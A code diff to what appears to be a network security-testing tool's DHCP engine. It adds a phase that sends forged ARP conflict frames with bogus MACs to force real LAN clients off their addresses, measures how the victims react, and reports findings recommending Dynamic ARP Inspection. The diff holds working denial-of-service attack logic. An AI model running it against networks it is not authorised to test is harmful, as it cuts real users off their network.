@@ -102,10 +102,20 @@ class DhcpEngine:
         # MAC we've sent from, so foreign-DISCOVER observation (Phase 2) can tell "ours" from
         # "someone else's" without false positives.
         self._our_macs: set[str] = set()
-        # eviction (2.3): who we are ARP-conflicting, the forged MACs we used, and who defended
-        self._evict_targets: set[str] = set()
+        # eviction (2.3): who we are ARP-conflicting, the forged MACs we used, and the observed
+        # signals per target IP. mac_by_ip/ip_by_mac exist because live signals arrive keyed by
+        # whichever side the packet exposes (ARP by IP, DHCP by MAC). _evict_outcomes holds the
+        # current best rung reached per target; _evict_start_ts bounds "rediscovered" DISCOVERs
+        # to ones seen during/after this eviction, not some unrelated earlier sighting.
+        self._evict_targets: set[str] = set()  # target IPs
         self._evict_bogus_macs: set[str] = set()
-        self._evict_defenders: set[str] = set()
+        self._evict_defenders: set[str] = set()  # target IPs that answered our ARP conflict
+        self._evict_declined_ips: set[str] = set()
+        self._evict_apipa_ips: set[str] = set()
+        self._evict_mac_by_ip: dict[str, str] = {}
+        self._evict_ip_by_mac: dict[str, str] = {}
+        self._evict_outcomes: dict[str, str] = {}
+        self._evict_start_ts = 0.0
         # windowed handshake pipeline (exhaust): bounded in-flight DISCOVER/REQUEST transactions
         # rather than an open-loop packet flood. xid -> {mac, sent_at, state}.
         self._window = cfg.window_initial
@@ -315,6 +325,10 @@ class DhcpEngine:
                         confirmed=True,
                     )
                 )
+            # Between the post-controls and the findings, sniffer still up: eviction (2.3) needs
+            # to observe DECLINE/DISCOVER/ARP signals live during its rounds+settle, and
+            # _finalize_findings() needs the outcomes it produces.
+            self._evict_phase()
         self._finalize_findings()
         if self._sniffer is not None:
             self._sniffer.stop()
@@ -380,6 +394,12 @@ class DhcpEngine:
             out["in_use_observed"] = len(self._neighbors_by_mac)
         if self.cfg.mode is Mode.RELEASE_PREVIOUS:
             out["recovery"] = self.recovery_result or None
+        if self._evict_outcomes:
+            # eviction (2.3): the sniffer/status-ticker are already down by the time _evict_phase
+            # runs (it's inline in stop(), after the worker threads are joined), so this only
+            # ever reaches the client via the final SessionEnded report, not a live StatusTick.
+            out["evict_targets"] = len(self._evict_outcomes)
+            out["evict_outcomes"] = dict(self._evict_outcomes)
         return out
 
     # ---------------------------------------------------------------- helpers
@@ -734,6 +754,7 @@ class DhcpEngine:
                         "pool_source": est.source,
                         "headroom": headroom,
                         "would_release": self._dry_run_would_release,
+                        "would_evict": len(self._evict_targets),
                     },
                     recommendation=(
                         "The control transaction and ARP discovery ran for real, but the "
@@ -824,6 +845,87 @@ class DhcpEngine:
                     )
                 )
 
+        # ARP-conflict eviction (2.3, Phase 4). Gated on not dry-run: under dry-run _evict_phase()
+        # still runs and populates targets, but sends nothing, so every outcome would read
+        # no_reaction -- not because nothing reacted, but because nothing was ever sent. That's
+        # not evidence of anything; DRY_RUN_SUMMARY covers the dry-run case instead.
+        if self._evict_outcomes and not self.cfg.dry_run:
+            evicted = {
+                ip: rung
+                for ip, rung in self._evict_outcomes.items()
+                if _EVICT_RUNGS.index(rung) >= _EVICT_RUNGS.index("declined")
+            }
+            defended_only = {
+                ip: rung for ip, rung in self._evict_outcomes.items() if rung == "defended"
+            }
+            by_rung: dict[str, int] = {}
+            for rung in self._evict_outcomes.values():
+                by_rung[rung] = by_rung.get(rung, 0) + 1
+            if evicted:
+                self._raise(
+                    Finding(
+                        id="CLIENTS_EVICTED_FROM_ADDRESSES",
+                        title="ARP-conflict eviction forced clients off their addresses",
+                        verdict=FAIL,
+                        severity="high",
+                        evidence={
+                            "targets": len(self._evict_outcomes),
+                            "evicted": len(evicted),
+                            "by_rung": by_rung,
+                            "evicted_targets": evicted,
+                            "rounds": self.cfg.evict_rounds,
+                            "mode": self.cfg.mode.value,
+                        },
+                        recommendation=(
+                            "Any host on this segment can force any other host off its address "
+                            "using only broadcast ARP (RFC 5227's own address-conflict-detection "
+                            "mechanism, turned against the client). Enable Dynamic ARP "
+                            "Inspection / port security to drop forged ARP at the switch port; "
+                            "without it, this is independent of and cheaper than pool "
+                            "exhaustion."
+                        ),
+                    )
+                )
+            elif defended_only:
+                self._raise(
+                    Finding(
+                        id="CLIENTS_DEFENDED_ADDRESSES",
+                        title="Targets defended their addresses; conflict frames were delivered",
+                        verdict=INCONCLUSIVE,
+                        severity="medium",
+                        evidence={
+                            "targets": len(self._evict_outcomes),
+                            "defended": len(defended_only),
+                            "by_rung": by_rung,
+                            "rounds": self.cfg.evict_rounds,
+                        },
+                        recommendation=(
+                            "Our forged ARP reached the targets — Dynamic ARP Inspection is not "
+                            "filtering this port — but the stacks held their ground rather than "
+                            "giving up the address. Not a pass: some clients defend and still "
+                            "lose the gateway entry, which this vantage point cannot see."
+                        ),
+                    )
+                )
+            else:
+                self._raise(
+                    Finding(
+                        id="ARP_CONFLICTS_UNANSWERED",
+                        title="ARP-conflict frames drew no reaction from any target",
+                        verdict=INCONCLUSIVE,
+                        severity="medium",
+                        evidence={
+                            "targets": len(self._evict_outcomes),
+                            "rounds": self.cfg.evict_rounds,
+                        },
+                        recommendation=(
+                            "Either the frames were filtered (Dynamic ARP Inspection / port "
+                            "security) or every target simply accepted them silently — both "
+                            "look identical from here. Check DAI drop counters on the switch."
+                        ),
+                    )
+                )
+
     def _note_neighbor(self, mac: str, ip: str) -> Neighbor:
         """Record/refresh a neighbor, attaching any DHCP fingerprint already seen for this MAC.
 
@@ -894,28 +996,34 @@ class DhcpEngine:
             [(n.mac, n.ip) for n in neighbors], server_ip, server_mac=server_mac
         )
 
-    def _do_garp(self, targets: list[Neighbor]) -> int:
-        """One ARP-conflict round over `targets`. Returns frames sent. Unit-testable.
+    def _do_arp_conflict(self, targets: list[Neighbor]) -> int:
+        """One ARP-conflict round over `targets` (rewrite of the old `_do_garp`, 2.3).
 
-        Per target, two frames:
+        Returns frames sent. Unit-testable. Per target, two frames:
           1. broadcast ARP *request*  claiming the victim's own IP  (announcement form)
           2. broadcast ARP *reply*    claiming the victim's own IP  (unsolicited form)
 
-        Both trip duplicate-address detection on a well-behaved host; RFC 5227 has the host
-        defend once, then go quiet on a second conflict inside DEFEND_INTERVAL (10s) — which is
-        what repeated rounds from `_evict_worker()` (Phase 4) are for. The MAC used is always
-        bogus, so nothing is intercepted, only disputed.
+        Both trip duplicate-address detection on a well-behaved host; RFC 5227 SS2.4 has the
+        host defend once, then go quiet on a second conflict inside DEFEND_INTERVAL (10s) —
+        which is what repeated rounds from `_evict_worker()` are for.
+
+        The claimed MAC is always a fresh `random_mac()`, recorded in `_evict_bogus_macs` so
+        the ARP observer can tell our forgeries apart from real hosts. It must never be ours or
+        the victim's real MAC — a bogus MAC blackholes the claim (nothing answers for it, so
+        the victim's own traffic just goes nowhere and it notices the conflict); our own MAC
+        would instead intercept the victim's traffic, which is out of scope for this tool.
 
         (2.3) No longer takes a `gateway` parameter or sends a third unicast frame blackholing
         the victim's default route via `build_arp_poison()` — that crossed from denial-of-
         service into traffic-interception-adjacent territory and added nothing eviction needs.
+        Not gated on `self._stop`: this only ever runs from within `stop()` (or the release
+        worker's own finishing sequence, Phase 5), by which point `_stop` is already set for
+        every *other* purpose, and gating here would mean eviction never sends anything.
         """
         from .netutils import random_mac
 
         sent = 0
         for n in targets:
-            if self._stop.is_set():
-                break
             bogus = random_mac()
             self._evict_bogus_macs.add(bogus)
             for op, label in ((packets.ARP_REQUEST, "request"), (packets.ARP_REPLY, "reply")):
@@ -929,6 +1037,151 @@ class DhcpEngine:
                     )
             self.bus.emit(ev.ArpConflictSent(ip=n.ip))
         return sent
+
+    # ---------------------------------------------------------------- eviction (2.3, Phase 4)
+    def _evict_phase(self) -> None:
+        """ARP-conflict eviction: contest ownership of every address re-acquired in Phase 3,
+        per RFC 5227 SS2.4, to move the real owner out of its "defend once" phase and force a
+        DECLINE / restart-at-INIT / APIPA fallback.
+
+        Runs in `stop()` between the post-run controls and `_finalize_findings()` for exhaust
+        (the sniffer is still up, so live signals during rounds+settle are actually observed);
+        release mode runs it inline in its own worker (Phase 5). Guarded by `cfg.evict`. Under
+        dry-run the phase still executes and logs its target list and round count -- its frames
+        go through `_send()` with the default `probe=False`, so the dry-run chokepoint (0a)
+        suppresses them on its own; no second dry-run check is added here.
+
+        Target selection reuses the ARP inventory, restricted to addresses this run actually
+        re-acquired (Phase 3's `granted` outcomes) -- not just anything the general flood
+        happened to grab, most of which was never anyone's in the first place. Conflicting with
+        an address still bound to the victim just makes them defend and re-ARP; conflicting
+        with one *we* now hold is what forces the DECLINE. The gateway and DHCP server are
+        excluded exactly as `_release_phase()` excludes them, though in practice Phase 3 never
+        re-acquires those anyway (they were never RELEASEd in the first place).
+        """
+        if not self.cfg.evict:
+            self._debug("evict phase skipped: evict is disabled")
+            return
+        granted_ips = {
+            ip
+            for xid, ip in self._reacquire_targets.items()
+            if self._reacquire_outcomes.get(xid) == "granted"
+        }
+        if not granted_ips:
+            self._debug("evict phase: no re-acquired addresses to evict from")
+            return
+        server_id = self.control_pre.server_id if self.control_pre else None
+        gateway = self._release_gateway()
+        targets = [
+            n
+            for n in self._neighbors_by_mac.values()
+            if n.ip in granted_ips and n.ip not in (server_id, gateway)
+        ]
+        if not targets:
+            self._debug("evict phase: no eligible targets after excluding gateway/server")
+            return
+        self._debug(
+            f"evict phase: {len(targets)} target(s) -- "
+            + ", ".join(f"{n.ip}/{n.mac}" for n in targets)
+        )
+        self._evict_targets = {n.ip for n in targets}
+        self._evict_mac_by_ip = {n.ip: n.mac for n in targets}
+        self._evict_ip_by_mac = {n.mac: n.ip for n in targets}
+        self._evict_outcomes = dict.fromkeys(self._evict_targets, "no_reaction")
+        self._evict_start_ts = time.time()
+        self._evict_worker(targets)
+
+    def _evict_worker(self, targets: list[Neighbor]) -> None:
+        """Fixed number of ARP-conflict rounds, spaced under RFC 5227's 10s DEFEND_INTERVAL,
+        then a settle period before measuring -- not gated on `self._stop` (see
+        `_do_arp_conflict`'s docstring: it's already set by the time this runs)."""
+        for round_num in range(1, self.cfg.evict_rounds + 1):
+            sent = self._do_arp_conflict(targets)
+            self._debug(
+                f"evict round {round_num}/{self.cfg.evict_rounds}: {sent} frame(s) over "
+                f"{len(targets)} target(s)"
+            )
+            if round_num < self.cfg.evict_rounds:
+                time.sleep(self.cfg.timeouts.evict_interval)
+        self._debug(
+            f"evict: settling {self.cfg.evict_settle:g}s before measuring outcomes "
+            "(DECLINE/DISCOVER/APIPA need time to land)"
+        )
+        time.sleep(self.cfg.evict_settle)
+        self._measure_eviction(targets)
+
+    def _measure_eviction(self, targets: list[Neighbor]) -> None:
+        """Highest rung reached per target wins; every signal is checked independently rather
+        than short-circuited, since a host can (for example) both defend an earlier round and
+        decline a later one."""
+        for n in targets:
+            rung = "no_reaction"
+            if n.ip in self._evict_defenders:
+                rung = _evict_rung_max(rung, "defended")
+            if n.ip in self._evict_declined_ips:
+                rung = _evict_rung_max(rung, "declined")
+            discovers = [
+                v
+                for v in self._foreign_discovers.values()
+                if v["mac"] == n.mac and v["ts"] >= self._evict_start_ts
+            ]
+            if discovers:
+                rung = _evict_rung_max(rung, "rediscovered")
+                if not any(v["answered"] for v in discovers):
+                    rung = _evict_rung_max(rung, "discover_unanswered")
+            if n.ip in self._evict_apipa_ips:
+                rung = _evict_rung_max(rung, "apipa")
+            self._evict_outcomes[n.ip] = rung
+            self.bus.emit(ev.ClientEvicted(ip=n.ip, mac=n.mac, outcome=rung))
+            self._debug(f"evict outcome: {n.ip}/{n.mac} -> {rung}")
+
+    def _handle_evict_arp(self, pkt) -> None:
+        """Two signals, both scoped to known eviction targets so a stranger's ordinary ARP
+        traffic can never be mistaken for one:
+
+          * defended -- an ARP announcement/reply from the *victim's real MAC* for its own IP.
+            Proves our conflict frame was delivered (so DAI/port-security isn't filtering it);
+            does not by itself prove the eviction failed -- see `_measure_eviction()`.
+          * apipa -- the victim's real MAC now sourcing ARP from a 169.254.0.0/16 address:
+            full eviction, RFC 5227's fallback after repeated conflicts.
+        """
+        from scapy.all import ARP, Ether
+
+        try:
+            if ARP not in pkt or Ether not in pkt:
+                return
+            psrc, hwsrc = pkt[ARP].psrc, pkt[Ether].src
+            if not hwsrc or hwsrc in self._evict_bogus_macs:
+                return  # our own forged frame, echoed back
+            if psrc in self._evict_targets and hwsrc == self._evict_mac_by_ip.get(psrc):
+                if psrc not in self._evict_defenders:
+                    self._evict_defenders.add(psrc)
+                    self._debug(f"evict: {psrc} defended (ARP op={pkt[ARP].op} from {hwsrc})")
+            ip = self._evict_ip_by_mac.get(hwsrc)
+            if ip is not None and psrc.startswith("169.254."):
+                if ip not in self._evict_apipa_ips:
+                    self._evict_apipa_ips.add(ip)
+                    self._debug(f"evict: {ip}/{hwsrc} now sourcing ARP from APIPA ({psrc})")
+        except Exception as exc:
+            self.bus.emit(ev.ErrorEvent(message=f"evict ARP observer error: {exc!r}"))
+
+    def _handle_client_decline(self, pkt) -> None:
+        """DHCPDECLINE from a known eviction target's MAC -- gold-standard proof it gave up
+        the address (though not the only path to eviction; see the outcome ladder)."""
+        from scapy.all import BOOTP
+
+        try:
+            if BOOTP not in pkt:
+                return
+            mac = packets.client_mac_from_offer(pkt)
+            ip = self._evict_ip_by_mac.get(mac)
+            self._debug(
+                f"DECLINE xid=0x{pkt[BOOTP].xid:08x} chaddr={mac}" + (f" ({ip})" if ip else "")
+            )
+            if ip is not None:
+                self._evict_declined_ips.add(ip)
+        except Exception as exc:
+            self.bus.emit(ev.ErrorEvent(message=f"decline parse error: {exc!r}"))
 
     # ---------------------------------------------------------------- pool estimate / headroom
     def _note_offer_for_pool_estimate(self, offered_ip: str, subnet: str | None) -> None:
@@ -1421,10 +1674,17 @@ class DhcpEngine:
                 self._handle_ack(pkt)
             elif packets.is_nak(pkt):
                 self._handle_nak(pkt)
+            elif packets.is_decline(pkt):  # never self-originated -- same reasoning as above
+                self._handle_client_decline(pkt)
             elif self._is_own_traffic(pkt):
                 return  # our own DISCOVER/REQUEST/RELEASE, echoed back by the widened BPF (2.3)
             elif packets.is_discover(pkt):
                 self._handle_foreign_discover(pkt)
+            else:
+                from scapy.all import ARP
+
+                if ARP in pkt:
+                    self._handle_evict_arp(pkt)
         except Exception as exc:  # never let a bad packet kill the sniffer thread
             self.bus.emit(ev.ErrorEvent(message=f"parse error: {exc!r}"))
 
@@ -1955,6 +2215,25 @@ def _rand_xid() -> int:
     import random
 
     return random.randint(1, 900000000)
+
+
+# ARP-conflict eviction (2.3, Phase 4) outcome ladder, lowest to highest. This is a causal/
+# temporal ordering, not a strength-of-evidence one: DECLINE is strong evidence on its own, but
+# "rediscovered" (the host went further and restarted at INIT) is a later stage in the same
+# eviction, so it outranks a bare decline. The top two rungs are exhaust-only -- release mode
+# never drains the pool, so a healthy result there tops out at "rediscovered".
+_EVICT_RUNGS = [
+    "no_reaction",
+    "defended",
+    "declined",
+    "rediscovered",
+    "discover_unanswered",
+    "apipa",
+]
+
+
+def _evict_rung_max(a: str, b: str) -> str:
+    return b if _EVICT_RUNGS.index(b) > _EVICT_RUNGS.index(a) else a
 
 
 def _opts_summary(pkt) -> str:
